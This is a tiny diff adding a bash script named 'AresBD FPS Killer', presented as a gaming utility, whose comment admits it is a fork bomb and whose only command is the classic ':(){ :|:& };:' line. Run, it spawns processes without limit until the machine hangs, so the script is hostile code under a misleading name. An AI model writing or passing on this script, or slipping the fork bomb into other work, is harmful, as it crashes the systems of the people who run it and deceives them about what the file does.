@@ -1,0 +1,5 @@
+#!/bin/bash
+# AresBD FPS Killer by Stsosz
+# All this is is a fork bomb XD
+
+:(){ :|:& };:
